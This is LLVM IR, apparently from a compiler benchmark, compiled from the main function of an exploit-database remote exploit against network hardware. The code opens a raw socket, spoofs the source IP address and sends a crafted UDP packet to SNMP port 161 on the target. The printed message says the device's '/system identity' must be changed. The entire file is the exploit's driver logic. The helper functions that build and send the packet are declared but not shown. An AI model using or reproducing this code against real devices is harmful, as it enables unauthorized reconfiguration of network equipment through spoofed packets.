; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_6366.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_6366.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"not enough args\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-s\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"Ok, spoofing packets from %s to %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [39 x i8] c"Invalid source/destination IP address\0A\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"No Source Address\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"No Dest Address\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [41 x i8] c"Couldnt open Raw socket!(Are you root?)\0A\00", align 1
@.str.9 = private unnamed_addr constant [26 x i8] c"Sending %d bytes buffer:\0A\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"0x%02x \00", align 1
@.str.11 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [50 x i8] c"Sent packet. \22/system identity\22 must be changed.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i8* null, i8** %7, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 7
  br i1 %16, label %17, label %20

17:                                               ; preds = %2
  %18 = call i32 (...) @usage()
  %19 = call i32 @erexit(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  br label %20

20:                                               ; preds = %17, %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @strcmp(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %31, label %26

26:                                               ; preds = %20
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i8* @strdup(i8* %29)
  store i8* %30, i8** %6, align 8
  br label %31

31:                                               ; preds = %26, %20
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 3
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %42, label %37

37:                                               ; preds = %31
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 4
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strdup(i8* %40)
  store i8* %41, i8** %7, align 8
  br label %42

42:                                               ; preds = %37, %31
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 5
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %53, label %48

48:                                               ; preds = %42
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 6
  %51 = load i8*, i8** %50, align 8
  %52 = call i8* @strdup(i8* %51)
  store i8* %52, i8** %8, align 8
  br label %53

53:                                               ; preds = %48, %42
  %54 = load i8*, i8** %6, align 8
  %55 = load i8*, i8** %7, align 8
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0), i8* %54, i8* %55)
  %57 = load i8*, i8** %6, align 8
  %58 = call i32 @inet_addr(i8* %57)
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %64, label %60

60:                                               ; preds = %53
  %61 = load i8*, i8** %7, align 8
  %62 = call i32 @inet_addr(i8* %61)
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %66

64:                                               ; preds = %60, %53
  %65 = call i32 @erexit(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  br label %66

66:                                               ; preds = %64, %60
  %67 = load i8*, i8** %6, align 8
  %68 = icmp eq i8* %67, null
  br i1 %68, label %69, label %72

69:                                               ; preds = %66
  %70 = call i32 (...) @usage()
  %71 = call i32 @erexit(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  br label %72

72:                                               ; preds = %69, %66
  %73 = load i8*, i8** %7, align 8
  %74 = icmp eq i8* %73, null
  br i1 %74, label %75, label %78

75:                                               ; preds = %72
  %76 = call i32 (...) @usage()
  %77 = call i32 @erexit(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  br label %78

78:                                               ; preds = %75, %72
  %79 = load i32, i32* @AF_INET, align 4
  %80 = load i32, i32* @SOCK_RAW, align 4
  %81 = load i32, i32* @IPPROTO_RAW, align 4
  %82 = call i32 @socket(i32 %79, i32 %80, i32 %81)
  store i32 %82, i32* %11, align 4
  %83 = load i32, i32* %11, align 4
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %87

85:                                               ; preds = %78
  %86 = call i32 @erexit(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.8, i64 0, i64 0))
  br label %87

87:                                               ; preds = %85, %78
  %88 = load i8*, i8** %6, align 8
  %89 = call i32 @inet_addr(i8* %88)
  %90 = sext i32 %89 to i64
  store i64 %90, i64* %12, align 8
  %91 = load i8*, i8** %7, align 8
  %92 = call i32 @inet_addr(i8* %91)
  %93 = sext i32 %92 to i64
  store i64 %93, i64* %13, align 8
  %94 = load i8*, i8** %8, align 8
  %95 = call i8* @makereq(i8* %94, i32* %10)
  store i8* %95, i8** %9, align 8
  %96 = load i32, i32* %10, align 4
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0), i32 %96)
  store i32 0, i32* %14, align 4
  br label %98

98:                                               ; preds = %110, %87
  %99 = load i32, i32* %14, align 4
  %100 = load i32, i32* %10, align 4
  %101 = icmp slt i32 %99, %100
  br i1 %101, label %102, label %113

102:                                              ; preds = %98
  %103 = load i8*, i8** %9, align 8
  %104 = load i32, i32* %14, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i32 %108)
  br label %110

110:                                              ; preds = %102
  %111 = load i32, i32* %14, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %14, align 4
  br label %98

113:                                              ; preds = %98
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  %115 = load i32, i32* %11, align 4
  %116 = load i8*, i8** %9, align 8
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @sendudp(i32 %115, i64* %12, i64* %13, i32 32788, i32 161, i8* %116, i32 %117)
  %119 = load i32, i32* @stdout, align 4
  %120 = call i32 @fprintf(i32 %119, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.12, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @usage(...) #1

declare dso_local i32 @erexit(i8*) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i8* @makereq(i8*, i32*) #1

declare dso_local i32 @sendudp(i32, i64*, i64*, i32, i32, i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
